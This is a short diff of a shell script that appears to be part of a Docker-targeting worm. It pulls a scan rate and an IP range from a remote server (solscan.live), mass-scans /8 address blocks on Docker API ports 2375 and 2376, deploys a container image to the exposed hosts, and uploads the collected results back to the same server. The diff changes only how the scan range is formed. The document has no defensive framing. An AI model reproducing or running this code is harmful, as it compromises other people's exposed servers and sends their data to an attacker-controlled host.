@@ -45,8 +45,8 @@ if [ -z "$CONTAINER" ] ; then CONTAINER="nmlmweb3/upspin" ; fi
 SRATE=$(curl -s http://solscan.live/range/d_rate.txt)
 if [ -z "$SRATE" ] ; then SRATE="100000" ; fi
 RANGE=$(curl -s http://solscan.live/range/d.php)
-RANGETOSCAN=$RANGE".0.0.0/8"
-if [ -z "$RANGETOSCAN" ] ; then RANGETOSCAN=$(($RANDOM%255+1)).0.0.0/8 ; fi
+RANGETOSCAN=$RANGE".0/8"
+if [ -z "$RANGETOSCAN" ] ; then RANGETOSCAN=$(($RANDOM%255+1)).0/8 ; fi
 DOCKERGEDDON $RANGETOSCAN 2375 $SRATE $CONTAINER
 if [ -f "/tmp/out.txt" ] ; then curl -F "userfile=@/tmp/out.txt" http://solscan.live/results/d.php ; rm -f /tmp/out.txt ; fi
 DOCKERGEDDON $RANGETOSCAN 2376 $SRATE $CONTAINER
